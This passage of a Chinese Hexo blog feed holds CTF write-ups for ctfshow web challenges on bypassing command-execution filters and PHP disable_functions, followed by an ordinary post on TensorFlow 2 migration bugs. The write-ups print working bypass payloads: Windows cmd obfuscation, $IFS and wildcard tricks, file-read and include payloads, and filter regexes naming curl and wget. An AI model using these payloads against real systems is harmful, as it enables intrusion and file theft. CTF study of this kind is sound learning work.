<h2 id="Windows绕过姿势"><a href="#Windows绕过姿势" class="headerlink" title="Windows绕过姿势"></a>Windows绕过姿势</h2><h3 id="符号与命令"><a href="#符号与命令" class="headerlink" title="符号与命令"></a>符号与命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;&#x2F;正常执行</span><br><span class="line">w&quot;h&quot;o&quot;a&quot;m&quot;i 或&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;或&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i或w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;&#x2F;&#x2F;正常执行</span><br><span class="line">who^ami或wh&quot;&quot;o^a^mi 或wh&quot;&quot;o^a^mi&quot;&#x2F;&#x2F;正常执行</span><br><span class="line">但是&quot;wh&quot;&quot;o^a^mi&quot;这种在开头就有单引号的情况是不能执行的</span><br><span class="line">(Whoami)或(Wh^o^am&quot;&quot;i)或((((Wh^o^am&quot;&quot;i)))) &#x2F;&#x2F;正常执行  注:可以加无数个&quot;但不能同时连续加2个^符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义</span><br></pre></td></tr></table></figure>
<h3 id="管道符-1"><a href="#管道符-1" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|        &#x2F;&#x2F;直接执行后面的语句</span><br><span class="line">||       &#x2F;&#x2F;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;       &#x2F;&#x2F;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<h3 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h3><p><em>知识点:用两个%括起来的变量,会输出变量的值</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;1     &#x2F;&#x2F;设置变量a，值为1</span><br><span class="line">echo a      &#x2F;&#x2F;此时输出结果为&quot;a&quot;</span><br><span class="line">echo %a%    &#x2F;&#x2F;此时输出结果为&quot;1&quot;</span><br></pre></td></tr></table></figure>
<p>接下来的进阶利用就是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;who</span><br><span class="line">set b&#x3D;ami</span><br><span class="line">%a%%b% &#x2F;&#x2F;正常执行whoami</span><br><span class="line">call %a%%b% &#x2F;&#x2F;正常执行whoami</span><br></pre></td></tr></table></figure>
<p>所以,上述的符号与命令部分的所有操作,都可以通过set来实现,只需要慢慢拼接就ok</p>
<h3 id="切割字符："><a href="#切割字符：" class="headerlink" title="切割字符："></a>切割字符：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;whoami</span><br><span class="line">%a:~0%     &#x2F;&#x2F;取出所有字符,所以正常执行命令</span><br><span class="line">%a:~0,6%   &#x2F;&#x2F;从开始切割6个字符,刚好是whoami,所以正常执行</span><br><span class="line">%a:~0,5%   &#x2F;&#x2F;切割后是whoam,不是系统命令,不能执行</span><br></pre></td></tr></table></figure>
<p>注:上述可以使用减号,和python的切割效果差不多</p>
<p>所以,可以考虑的东西就来了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;abc qwe     &#x2F;&#x2F;先自定义</span><br><span class="line">wh^o^%a:~0,1%mi   &#x2F;&#x2F;然后截断整理后就变成了:wh^o^ami,所以命令执行成功</span><br></pre></td></tr></table></figure>
<p>可以简单地写出webshell</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="http://blog.leanote.com/post/bowu/de8babf67fd8">Bowu博客：CTF之命令执行绕过总结</a></p>
<p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">NPFS博客：命令执行绕过小技巧</a></p>
<p><a href="https://www.ghtwf01.cn/index.php/archives/273/">ghtwf01博客：命令执行漏洞利用及绕过方式总结</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501">羽师傅博客：无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客：无字母数字webshell之提高篇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神博客：一些不包含数字和字母的webshell</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky博客：无字母数字的命令执行(ctfshow web入门 55）</a></p>
<p>还有文中直接引用的博客部分。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行绕过disable_functions</title>
    <url>/2021/04/19/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87disable_functions/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行绕过disable-functions"><a href="#ctfshow命令执行绕过disable-functions" class="headerlink" title="ctfshow命令执行绕过disable_functions"></a>ctfshow命令执行绕过disable_functions</h1><p>船新版本，绕过禁用函数。</p>
<span id="more"></span>
<h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>绕过disable_function，那我们先看一下phpinfo() ，然后发现被禁了？？？<del>那还绕什么，关闭浏览器</del></p>
<p>整理一下payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;高亮显示php文件</span><br><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br><span class="line">&#x2F;&#x2F;通过复制，重命名读取php文件内容（函数执行后，访问url&#x2F;flag.txt）</span><br><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);          </span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);        </span><br><span class="line">&#x2F;&#x2F;单一函数读文件内容：</span><br><span class="line">echo file_get_contents(&quot;flag.php&quot;);   </span><br><span class="line">readfile(&quot;flag.php&quot;);                      </span><br><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br><span class="line">&#x2F;&#x2F;文件包含绕过：</span><br><span class="line">post:c&#x3D;include($_GET[1]);</span><br><span class="line">get:?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>再贴出羽师傅的一些其他操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">用法：</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetss($a);echo $line;&#125;       &#x2F;&#x2F;php7.3版本后 该函数已不再被使用</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);                                      &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);                                   &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125;        &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetc($a);echo $line;&#125;        &#x2F;&#x2F;过60</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);print_r($line);&#125;  &#x2F;&#x2F;过60</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag不在flag.php中,需要先查找flag所在的位置</span><br><span class="line">scandir()</span><br><span class="line">opendir()</span><br><span class="line">用法</span><br><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));highlight_file(&quot;&#x2F;flag.txt&quot;);                                                           &#x2F;&#x2F;过66-67</span><br><span class="line">c&#x3D;$a&#x3D;opendir(&quot;&#x2F;&quot;); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;highlight_file(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-67</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后面因为是txt文件，所以直接用include直接包含就能显示flag</span><br><span class="line">include()</span><br><span class="line">require()</span><br><span class="line">用法：</span><br><span class="line">include(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br><span class="line">require(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br></pre></td></tr></table></figure>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
</blockquote>
<h2 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><p>同上。</p>
<h3 id="2、解答："><a href="#2、解答：" class="headerlink" title="2、解答："></a>2、解答：</h3><p>没变，但是flag不在当前文件夹下了。需要扫目录：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">c&#x3D;print_r(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>扫出目录后highlight_file()即可</p>
<h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>ban了highlight_file()</p>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>试试include(‘/flag.php’) 发现太大出不来。考虑到flag应该在根目录下的flag.txt里，于是直接用包含做。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;include_once(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure>
<p>扩展：扫目录函数被ban完了。记录下Y4的扫目录操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>官方介绍：</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
</blockquote>
<p>利用exit，停止后面的程序</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;require(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h2 id="web72（不会）"><a href="#web72（不会）" class="headerlink" title="web72（不会）"></a>web72（不会）</h2><p>不会，之后学</p>
<h2 id="web73、74"><a href="#web73、74" class="headerlink" title="web73、74"></a>web73、74</h2><p>文件不再是flag.txt了，需要自己扫，但是扫的东西ban了一大半。</p>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通过glob遍历目录：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php</span><br><span class="line">	$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#39; &#39;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>扫出来一回正常文件包含梭了。</p>
<p>能做的题都在这了，之后会总结一下命令执行的操作和姿势。</p>
<h2 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote>
<p><a href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
<p><a href="https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>运用tensorflow2在人脸识别中遇到的问题和bug</title>
    <url>/2021/04/17/%E8%BF%90%E7%94%A8tensorflow2%E5%9C%A8%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8Cbug/</url>
    <content><![CDATA[<h1 id="运用tensorflow2在人脸识别中遇到的问题和bug"><a href="#运用tensorflow2在人脸识别中遇到的问题和bug" class="headerlink" title="运用tensorflow2在人脸识别中遇到的问题和bug"></a>运用tensorflow2在人脸识别中遇到的问题和bug</h1><p>之前做科创项目时遇到的一些问题的解决方案，特此记录。</p>
<span id="more"></span>
<h2 id="bug1：TensorFlow2与TensorFlow1不兼容的问题。"><a href="#bug1：TensorFlow2与TensorFlow1不兼容的问题。" class="headerlink" title="bug1：TensorFlow2与TensorFlow1不兼容的问题。"></a>bug1：TensorFlow2与TensorFlow1不兼容的问题。</h2><p>这是目前最为常见的问题，由于卷积神经网络最火的时间在18年，当时产出了大量优质的项目和开源代码供使用。但如果今日想要复现当时的成果时，会遭遇TensorFlow和python版本更新后不兼容的问题。</p>
<p>推测当时版本：TensorFlow1，python3.6</p>
<p>根据网上报错的解答，可以得知TensorFlow1.13版本不兼容python3.7环境，偌使用python3.7环境，建议将TensorFlow更新至1.15。</p>
<p>本机环境采用的TensorFlow2.0版本</p>
<h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>既然问题已经非常明显了，当遇到报错提示为(此类型通用)</p>
<p><code>AttributeError: module &#39;tensorflow&#39; has no attribute</code></p>
<p>意味着TensorFlow2中不再有改模块。</p>
<h5 id="给出两种解决方案："><a href="#给出两种解决方案：" class="headerlink" title="给出两种解决方案："></a>给出两种解决方案：</h5><p>1、卸载当前版本TensorFlow，回到源代码版本的TensorFlow</p>
<p>2、将以下代码进行修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br></pre></td></tr></table></figure>
<p>改为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow.compat.v1 <span class="keyword">as</span> tf</span><br><span class="line">tf.disable_v2_behavior()</span><br></pre></td></tr></table></figure>
<p>此法可以解决90%的报错。但是有一个例外，也就是<u><strong>contrib</strong></u>模块。</p>
<p>此模块的解决方案：建议回TensorFlow1+python3.6，或者根据官方文档及上述引用链接自行修改。</p>
<p><strong>4月20日更新：</strong></p>
<p>contrib模块中的slim已经没了，如果需要调用slim模块，需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install tf_slim</span><br></pre></td></tr></table></figure>
<p>将配置文件中的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">slim = tf.contrib.slim()</span><br></pre></td></tr></table></figure>
<p>全部改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">slim = tf_slim()</span><br></pre></td></tr></table></figure>
<p>且加上关闭TensorFlow2功能的相关语句。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/kyle1314608/article/details/100594884">https://blog.csdn.net/kyle1314608/article/details/100594884</a></p>
</blockquote>
<h2 id="bug2-cv2-imread-读取图片返回none。"><a href="#bug2-cv2-imread-读取图片返回none。" class="headerlink" title="bug2:cv2.imread()读取图片返回none。"></a>bug2:cv2.imread()读取图片返回none。</h2><p>读取图片返回空，会直接导致后期图片处理出问题，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cv2.error: OpenCV(3.4.3) C:\projects\opencv-python\opencv\modules\imgproc\src\resize.cpp:4044: error: (-215:Assertion failed) !ssize.empty() in function &#39;cv::resize’</span><br></pre></td></tr></table></figure>
<h3 id="解决方案：-1"><a href="#解决方案：-1" class="headerlink" title="解决方案："></a>解决方案：</h3><h4 id="原因1：图片路径形式书写错误"><a href="#原因1：图片路径形式书写错误" class="headerlink" title="原因1：图片路径形式书写错误"></a>原因1：图片路径形式书写错误</h4><p>\在程序中为转义符号，不可用错</p>
<p>OpenCV读取路径单路径即可，不需要 // </p>
<p>错误的形式：C:\Users\Desktop\test<br>正确的应该：C:/Users/Desktop/test/</p>
<h4 id="原因2：图片路径没有写全"><a href="#原因2：图片路径没有写全" class="headerlink" title="原因2：图片路径没有写全"></a>原因2：图片路径没有写全</h4><p>具体图片精确到 .jpg/.png</p>
<p>具体文件夹精确到：test/</p>
<p>正确的应该：C:/Users/Desktop/test/</p>
<h4 id="原因3：路径中带中文"><a href="#原因3：路径中带中文" class="headerlink" title="原因3：路径中带中文"></a>原因3：路径中带中文</h4><p>路径中绝对绝对绝对绝对绝对绝对不要有任何<strong><em><u>中文</u></em></strong>！！！特别是python3环境下</p>
<h4 id="原因4：图片数量不一致"><a href="#原因4：图片数量不一致" class="headerlink" title="原因4：图片数量不一致"></a>原因4：图片数量不一致</h4><p>你有多少图片，就搞多少图片，别自己变图片出来。</p>
<p>主要在循环遍历时才会遇到这个问题</p>
<h3 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/m0_37882192/article/details/108738901">https://blog.csdn.net/m0_37882192/article/details/108738901</a></p>
</blockquote>
<h2 id="bug3-checkpoint文件内部设置。"><a href="#bug3-checkpoint文件内部设置。" class="headerlink" title="bug3:checkpoint文件内部设置。"></a>bug3:checkpoint文件内部设置。</h2><p>以我的为参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G:&#x2F;science&#x2F;trainmodel&#x2F;model-600</span><br></pre></td></tr></table></figure>
<p>注意 ‘ / ‘ 以及模型不带后缀。</p>
<p>另外，训练时生成模型使用的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saver.save(sess, <span class="string">&#x27;G:/science/trainmodel/model&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>中的路径部分采用windows格式的 ‘ / ‘即可，我之前写python路径写顺手了，直接写了全部 // ，直接GG</p>
<h2 id="bug4-saver-restore恢复模型报错"><a href="#bug4-saver-restore恢复模型报错" class="headerlink" title="bug4:saver.restore恢复模型报错"></a>bug4:saver.restore恢复模型报错</h2><p>经典坑位之一，附上我的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saver.restore(sess, tf.train.latest_checkpoint(<span class="string">&#x27;G:/science/trainmodel&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>tf.train一行指调用生成的最后一个模型，还有多种参数可以按需使用。</p>
<p>路径单双斜杠均不受影响。</p>
]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行51-57</title>
    <url>/2021/04/14/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C51-57/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行51-57"><a href="#ctfshow命令执行51-57" class="headerlink" title="ctfshow命令执行51-57"></a>ctfshow命令执行51-57</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
<span id="more"></span>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>相较50过滤了更多东西，尤其是tac 。。。泪目</p>
<p>payload：<code>nl&lt;fl\ag.php||</code></p>
<p>上一题的payload依旧能过</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>整上一题的payload，发现&lt;被过滤了，且$放出来了。于是把&lt;换成$IFS，出了假flag。构筑payload查一下根目录先：<code>ls$IFS/||</code></p>
<p>发现根目录下有个flag，于是nl查看，出答案</p>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>。。。？不用||命令分隔了，直接上payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</span><br><span class="line">payload2:c&#x3D;nl$IFS\fla\g.php</span><br></pre></td></tr></table></figure>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:?c&#x3D;&#x2F;bin&#x2F;c??$&#123;IFS&#125;????????</span><br><span class="line">payload2:?c&#x3D;grep$&#123;IFS&#125;%27&#123;%27$&#123;IFS&#125;fl???php</span><br></pre></td></tr></table></figure>
